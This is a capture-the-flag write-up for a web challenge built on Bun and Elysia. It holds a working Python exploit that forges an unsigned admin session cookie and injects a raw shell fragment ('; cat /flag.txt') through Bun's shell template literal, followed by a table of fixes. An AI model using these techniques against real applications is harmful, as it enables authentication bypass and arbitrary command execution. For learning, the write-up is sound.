# Elysia's Bakery — BITSCTF writeup

**Category:** Web | **Stack:** Bun + Elysia (TypeScript)

---

## Overview

A note-taking app built with Bun and the Elysia framework. Source code is provided.
The flag is at `/flag.txt` on the server, readable only through an admin-only endpoint.

---

## Reading the source

### The admin endpoint

```typescript
.post("/admin/list", async ({ cookie: { session }, body }) => {
  const data = getSessionData(session);
  if (!data) return status(401, "Unauthorized");
  if (!data.isAdmin) return status(403, "Forbidden");

  const folder = (body as any).folder;

  if (typeof folder === "string" && folder.includes("..")) {
    return status(400, "Invalid folder path");
  }
  const output = await $`ls ${folder}`.quiet().text();
  return { files: output.split("\n").filter(Boolean) };
})
```

Two things stand out:

1. **The path-traversal guard only runs when `folder` is a string.** Any other type skips it.
2. **The shell command interpolates `folder` directly.** Bun's `$` template literal has a special behaviour: if the interpolated value is an object with a `raw` property, it is inserted into the command **verbatim** — no quoting, no escaping.

### Session handling

```typescript
const app = new Elysia({
  cookie: {
    secrets: [Bun.env.SECRET_KEY || "super_secret_key"],
    sign: ["session"],           // signs on write
  },
})
```

```typescript
function getSessionUser(session: any): string | null {
  if (!session.value) return null;
  return typeof session.value === "string" ? session.value : null;
}
```

`sign: ["session"]` tells Elysia to sign the cookie when it **writes** it (at login).
However, Elysia does not **reject** unsigned cookies on read — `session.value` is simply
set to whatever string the client sends. Sending `Cookie: session=admin` with no
signature is accepted as a valid admin session.

---

## Vulnerabilities

### 1 — Cookie signature not verified on read

Elysia's `sign` option only adds a signature on `session.set()`. There is no guard that
rejects a cookie lacking a valid signature. Any client can claim to be any user by
setting `Cookie: session=<username>`.

### 2 — Bun shell `{raw}` injection (RCE)

Bun's `$` tagged template literal treats `{ raw: "…" }` as a raw shell fragment:

```js
$`ls ${{ raw: "; cat /flag.txt" }}`
// Executed as: ls ; cat /flag.txt
```

The `typeof folder === "string"` guard is never reached for objects, so there is no
obstacle between the attacker and arbitrary command execution.

---

## Exploit

Two lines of logic, three lines of code:

```python
import requests

url = "http://localhost:3000"

req = requests.post(
    url + "/admin/list",
    cookies={"session": "admin"},                          # bypass auth
    json={"folder": {"raw": "; cat /flag.txt 2>/dev/null"}} # RCE
)

out = "\n".join(req.json().get("files", [])) + req.json().get("error", "")
print(out)
```

- `cookies={"session": "admin"}` — unsigned cookie accepted as admin session.
- `"folder": {"raw": "…"}` — `typeof {…} === "object"`, guard skipped; `{raw:"…"}` injected verbatim into the shell command.

Output:
```
notes
public
src
...
BITSCTF{...}
```

---

## Root cause & fixes

| Bug | Fix |
|-----|-----|
| Unsigned cookies accepted | Reject cookies that fail signature verification; treat missing/invalid signature as unauthenticated |
| Elysia `sign` only applies on write | Use `unsignCookie` explicitly before trusting `session.value`, or upgrade to an Elysia version that enforces verification on read |
| User input in Bun shell template literal | Use `Bun.spawn(["ls", folder])` — argument arrays are never shell-interpreted |
| `typeof` guard skipped for non-strings | Explicitly reject non-string input: `if (typeof folder !== "string") return status(400, …)` |
